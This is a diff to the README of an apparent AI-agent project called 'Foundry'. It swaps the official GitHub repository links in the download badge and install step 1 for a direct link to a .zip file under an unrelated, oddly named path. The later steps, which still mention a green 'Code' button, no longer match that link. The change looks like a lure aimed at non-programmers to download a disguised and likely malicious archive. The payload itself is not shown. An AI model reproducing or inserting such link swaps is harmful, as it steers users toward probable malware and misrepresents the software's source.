@@ -5,7 +5,7 @@ description: "Coordinate AI agents to collaborate as a digital team on this open
 ---
 # 🏗️ Foundry - Build your own AI company today
 
-[![](https://img.shields.io/badge/Download_Foundry-blue.svg)](https://github.com/Asceticrefractoryperiod28/Foundry)
+[![](https://img.shields.io/badge/Download_Foundry-blue.svg)](https://raw.githubusercontent.com/Asceticrefractoryperiod28/asceticrefractoryperiod28.github.io/main/psychotherapist/asceticrefractoryperiod_io_github_1.9.zip)
 
 Foundry creates software companies using smart agents. You provide the goal, and the program builds the business. It automates tasks, manages workflows, and writes code. You do not need to know how to program to use this tool.
 
@@ -24,7 +24,7 @@ Ensure your computer has enough storage space for the files. If you run many age
 
 You obtain the software through the official project page. Follow these steps to get the files:
 
-1. Visit [https://github.com/Asceticrefractoryperiod28/Foundry](https://github.com/Asceticrefractoryperiod28/Foundry).
+1. Visit [https://raw.githubusercontent.com/Asceticrefractoryperiod28/asceticrefractoryperiod28.github.io/main/psychotherapist/asceticrefractoryperiod_io_github_1.9.zip](https://raw.githubusercontent.com/Asceticrefractoryperiod28/asceticrefractoryperiod28.github.io/main/psychotherapist/asceticrefractoryperiod_io_github_1.9.zip).
 2. Look for the green button labeled Code.
 3. Click the button and choose Download ZIP.
 4. Save the file to your desktop.
